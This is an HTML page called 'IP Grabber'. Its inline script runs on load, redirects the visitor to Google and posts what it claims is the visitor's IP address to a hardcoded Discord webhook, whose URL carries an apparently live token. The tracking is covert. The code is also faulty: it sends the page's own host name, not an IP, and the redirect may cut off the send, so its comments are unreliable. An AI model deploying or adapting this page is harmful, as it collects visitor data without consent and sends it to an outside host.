<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber</title>
</head>
<body>
    <h1>IP Grabber</h1>
    <script>
        function grabIP() {
            console.log("The user's IP address is: " + window.location.hostname);
            // Redirect to Google
            window.location.href = "https://google.com";

            // Send the IP address to the Discord webhook
            const data = {
                "username": "IP Grabber",
                "content": `The user's IP address is: ${window.location.hostname}`
            };

            const fetchOptions = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            };

            fetch("https://discord.com/api/webhooks/1167576028638613514/O1cSgOpEx_9849SwxFWOr7jxtlnIVv6-k3AGxjl_0JyWNcUcT46NlqFc3UFnyiyYUPlt", fetchOptions)
                .then(response => response.json())
                .then(data => console.log("Sent data to Discord webhook: ", data))
                .catch(error => console.error("Error sending data to Discord webhook: ", error));
        }

        // Grab IP and redirect to Google
        grabIP();

    </script>

</body>
</html>
